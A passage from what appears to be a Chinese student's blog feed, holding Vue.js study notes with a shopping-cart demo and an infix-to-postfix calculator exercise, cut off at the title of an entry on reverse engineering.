class="token punctuation">></span></span>&#123;&#123;item.name&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&#123;&#123;item.price&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>addone(index)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>                &#123;&#123;item.number&#125;&#125;                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reduceone(index)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>deleteone(index)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>删除<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>        总计:&#123;&#123;allprice&#125;&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js<span class="token punctuation">"</span></span>        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj<span class="token punctuation">"</span></span>        <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span>        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF<span class="token punctuation">"</span></span>        <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#vue_det'</span><span class="token punctuation">,</span>            <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">shopItems</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'苹果'</span><span class="token punctuation">,</span> <span class="token literal-property property">price</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'橘子'</span><span class="token punctuation">,</span> <span class="token literal-property property">price</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'香蕉'</span><span class="token punctuation">,</span> <span class="token literal-property property">price</span><span class="token operator">:</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#123;</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'橙子'</span><span class="token punctuation">,</span> <span class="token literal-property property">price</span><span class="token operator">:</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token literal-property property">allprice</span><span class="token operator">:</span> <span class="token number">0</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token function">addone</span><span class="token punctuation">(</span><span class="token parameter">index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>number <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>allprice <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>allprice <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>price                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token function">reduceone</span><span class="token punctuation">(</span><span class="token parameter">index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>number <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>number <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span>allprice <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>allprice <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>price                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"该商品数量已经为零！"</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token function">deleteone</span><span class="token punctuation">(</span><span class="token parameter">index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//价格的变化,要在删除这个选项之前</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>allprice <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>allprice <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token operator">*</span> <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>number                    <span class="token keyword">this</span><span class="token punctuation">.</span>shopItems<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习-1-Vue入门</title>
      <link href="/2021/11/06/vue-xue-xi-1-vue-ru-men/"/>
      <url>/2021/11/06/vue-xue-xi-1-vue-ru-men/</url>
      
        <content type="html"><![CDATA[<h1 id="第一个Vue-js应用"><a href="#第一个Vue-js应用" class="headerlink" title="第一个Vue.js应用"></a>第一个Vue.js应用</h1><p>有些东西没必要都详细的列出来，列个清单知道学了啥。不会再去查就行。</p><ul><li><strong>模板</strong> 可以渲染指定的内容到挂载的位置</li><li><strong>数据</strong> 双向绑定，数据发生变化。视图也跟着发生变化</li><li><strong>方法</strong> methods中定义 <code>&#123;&#123;say()&#125;&#125;</code>引用</li><li><strong>观察|监听</strong> watch选项可以监听数据变化</li><li><strong>数据绑定</strong> 插值<code>&#123;&#123;&#125;&#125;`、表达式绑定`&#123;&#123;complete?'完成':'未完成'&#125;&#125;</code>、双向数据绑定<code>v-model</code></li><li><strong>计算属性</strong> vue实例中的一个选项</li><li><strong>生命周期</strong> 看起来是跟浏览器渲染的顺序过程有关系</li></ul><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><blockquote><p>实现一个简单的计算器</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主要就是数据结构运算思路,由前缀表达式转换为后缀表达式，在通过后缀表达式进行运算。</p><p>因为是简单的计算器嘛，就十以内的加减乘除(<strong>不带括号的那种</strong>)。😊😊😊</p><p>参考的博客<a href="http://blog.csdn.net/antineutrino/article/details/6763722">http://blog.csdn.net/antineutrino/article/details/6763722</a></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>例子 1+2*3+1</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#vue_det'</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">one</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>  <span class="token literal-property property">equation</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token literal-property property">result</span><span class="token operator">:</span> <span class="token string">"hello"</span><span class="token punctuation">,</span>  <span class="token comment">// 后缀表达式</span>  <span class="token literal-property property">op</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">//运算符栈</span>  <span class="token literal-property property">nm</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment">//操作数栈</span>  <span class="token comment">// 判断运算符优先级</span>  <span class="token function-variable function">priorHigher</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">===</span> <span class="token string">'+'</span> <span class="token operator">||</span> a <span class="token operator">===</span> <span class="token string">'-'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b <span class="token operator">===</span> <span class="token string">'*'</span> <span class="token operator">||</span> b <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">number</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">var</span> str <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>equation <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>equation <span class="token operator">+</span> str<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token function-variable function">operator</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">var</span> str <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>equation <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>equation <span class="token operator">+</span> str<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">// 判断运算符优先级</span>  <span class="token function-variable function">priorHigher</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">===</span> <span class="token string">'+'</span> <span class="token operator">||</span> a <span class="token operator">===</span> <span class="token string">'-'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b <span class="token operator">===</span> <span class="token string">'*'</span> <span class="token operator">||</span> b <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token comment">// 中缀表达式转后缀</span>  <span class="token function-variable function">calculate</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//初始化</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>equation<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    tag <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token comment">//如果是数字就直接压栈</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isNaN</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>equation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>equation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//如果是运算符</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>tag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">//运算符栈中为空，就直接压</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>equation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>       tag <span class="token operator">=</span> <span class="token boolean">true</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>       <span class="token comment">//优先级比栈顶的高，那就压栈</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">priorHigher</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>equation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>equation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        tag <span class="token operator">=</span> <span class="token boolean">true</span>       <span class="token punctuation">&#125;</span>       <span class="token comment">//否则，弹出栈顶压入nm栈，再进行循环</span>       <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>       <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">var</span> fortag <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span>length   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fortag<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>   <span class="token punctuation">&#125;</span>   <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">)</span><span class="token comment">//简单的计算器给弄好了 Yes good</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//如果是数字就直接压栈</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isNaN</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//如果遇到了运算符,弹出栈顶的两个元素做对应的运算，再把结果压进去</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>     <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'+'</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>b<span class="token operator">+</span>a<span class="token punctuation">)</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'-'</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>b<span class="token operator">-</span>a<span class="token punctuation">)</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>b<span class="token operator">*</span>a<span class="token punctuation">)</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>b<span class="token operator">/</span>a<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">alert</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>op<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-1</title>
      <link href="/2021/11/06/ni-xiang-gong-cheng-he-xin-yuan-li-1/"/>
      <url>/2021/11/06/ni-xiang-gong-cheng-he-xin-yuan-li-1/</url>
      
